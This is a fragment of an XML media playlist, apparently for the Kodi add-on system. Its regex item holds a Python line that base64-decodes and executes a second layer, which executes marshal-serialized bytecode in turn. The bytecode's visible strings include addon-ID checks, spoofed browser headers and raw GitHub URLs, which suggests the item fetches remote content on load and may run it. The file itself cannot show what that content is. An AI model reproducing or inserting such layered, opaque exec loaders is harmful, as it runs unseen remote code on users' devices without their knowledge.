import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/S1r1T5Y.png</thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
</item>








</items>
